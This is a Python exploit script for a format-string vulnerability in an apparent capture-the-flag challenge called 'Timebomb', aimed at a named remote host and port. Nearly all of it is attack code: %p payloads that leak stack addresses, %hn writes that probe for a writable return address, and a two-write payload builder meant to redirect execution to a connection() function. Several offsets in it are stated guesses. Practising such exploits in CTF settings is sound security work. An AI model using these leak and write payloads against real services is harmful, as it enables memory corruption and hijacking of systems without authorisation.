#!/usr/bin/env python3
"""
Advanced Format String Exploitation for Timebomb CTF
Goal: Redirect execution to connection() function to get the flag
"""

import socket
import struct
import time

HOST = "timebomb-dc33.hexnova.quest"
PORT = 9999

def send_payload(payload, debug=False):
    """Send payload and get response"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    
    if debug:
        print(f"Sending: {payload}")
    
    s.send(payload.encode() + b'\n')
    
    # Get full response
    response = b""
    s.settimeout(3)
    try:
        while True:
            chunk = s.recv(1024)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    
    s.close()
    return response.decode('utf-8', errors='ignore')

def leak_addresses():
    """Leak stack addresses to find return address and function pointers"""
    print("=== Leaking Stack Addresses ===")
    
    addresses = {}
    for i in range(1, 30):
        payload = f"POS{i:02d}.%{i}$p"
        response = send_payload(payload, debug=False)
        
        # Extract the leaked value after "Enter your OVERRIDE CODE: "
        if "Enter your OVERRIDE CODE:" in response:
            parts = response.split("Enter your OVERRIDE CODE: ")[1].split("\n")[0].strip()
            print(f"Position {i:2d}: {parts}")
            addresses[i] = parts
            time.sleep(0.1)
    
    return addresses

def analyze_addresses(addresses):
    """Analyze leaked addresses to find code pointers and writable locations"""
    print("\n=== Address Analysis ===")
    
    code_addrs = []
    stack_addrs = []
    
    for pos, addr_str in addresses.items():
        if "0x" in addr_str:
            addr = addr_str.split("0x")[1].split()[0]  # Get the hex part
            try:
                addr_val = int(addr, 16)
                
                # Heuristics for identifying different address types
                if 0x400000 <= addr_val <= 0x500000:  # Typical PIE base
                    code_addrs.append((pos, addr_val, addr_str))
                    print(f"  Code address at pos {pos}: 0x{addr_val:x}")
                elif 0x7f0000000000 <= addr_val <= 0x7fffffffffff:  # libc/stack
                    if addr_val & 0xfff < 0x100:  # Likely function pointer
                        print(f"  Function ptr at pos {pos}: 0x{addr_val:x}")
                    else:
                        stack_addrs.append((pos, addr_val, addr_str))
                        print(f"  Stack address at pos {pos}: 0x{addr_val:x}")
                        
            except ValueError:
                continue
    
    return code_addrs, stack_addrs

def find_connection_offset():
    """Try to find the connection function by looking for code patterns"""
    print("\n=== Finding connection() function ===")
    
    # Let's leak a code address first to calculate base
    payload = "ADDR.%21$p"  # Based on your original finding
    response = send_payload(payload, debug=True)
    
    if "0x" in response:
        addr_str = response.split("0x")[1].split()[0]
        try:
            code_addr = int(addr_str, 16)
            print(f"Code address found: 0x{code_addr:x}")
            
            # Typical offset patterns for connection() in CTF binaries
            # These are educated guesses based on common compilation patterns
            potential_offsets = [-0x50, -0x40, -0x30, -0x20, -0x10, 0x10, 0x20, 0x30, 0x40, 0x50]
            
            for offset in potential_offsets:
                connection_addr = code_addr + offset
                print(f"  Potential connection() at: 0x{connection_addr:x} (offset {offset:+d})")
            
            return code_addr
            
        except ValueError:
            print("Could not parse code address")
            return None
    
    return None

def test_write_primitive():
    """Test writing to different stack positions to find writable return address"""
    print("\n=== Testing Write Primitives ===")
    
    # Test positions that might contain return addresses
    test_positions = [21, 22, 23, 24, 25]
    
    for pos in test_positions:
        print(f"\nTesting write to position {pos}:")
        
        # Try to write a small value (like 0x100) first
        payload = f"AAAA%256c%{pos}$hn"  # Write 0x100 (256 + 4 for "AAAA")
        response = send_payload(payload, debug=True)
        
        # Check if we get different behavior (crash, different output, etc.)
        if "[-] Done." not in response or len(response) < 500:
            print(f"  Position {pos}: Possible crash or different behavior")
        else:
            print(f"  Position {pos}: Normal behavior")
        
        time.sleep(0.2)

def craft_exploit(target_addr, write_pos):
    """Craft the final exploit payload"""
    print(f"\n=== Crafting Exploit ===")
    print(f"Target address: 0x{target_addr:x}")
    print(f"Write position: {write_pos}")
    
    # Split address into two 16-bit writes for reliability
    low_word = target_addr & 0xffff
    high_word = (target_addr >> 16) & 0xffff
    
    # Create payload with two writes
    # Format: AAAABBBB%<low_word>c%<pos>$hn%<high_word-low_word>c%<pos+1>$hn
    
    if high_word > low_word:
        diff = high_word - low_word
        payload = f"AAAABBBB%{low_word-8}c%{write_pos}$hn%{diff}c%{write_pos+1}$hn"
    else:
        # Handle wrap-around case
        diff = (0x10000 + high_word - low_word) % 0x10000
        payload = f"AAAABBBB%{low_word-8}c%{write_pos}$hn%{diff}c%{write_pos+1}$hn"
    
    print(f"Payload: {payload[:100]}...")  # Show first 100 chars
    return payload

if __name__ == "__main__":
    print("=== Timebomb CTF Advanced Format String Exploit ===")
    
    # Step 1: Leak addresses
    addresses = leak_addresses()
    
    # Step 2: Analyze addresses
    code_addrs, stack_addrs = analyze_addresses(addresses)
    
    # Step 3: Find connection function
    base_addr = find_connection_offset()
    
    # Step 4: Test write primitive
    test_write_primitive()
    
    print("\n=== Next Steps ===")
    print("1. Identify the correct return address position")
    print("2. Calculate exact connection() function address")
    print("3. Craft final exploit payload")
    print("4. Execute exploit to get flag")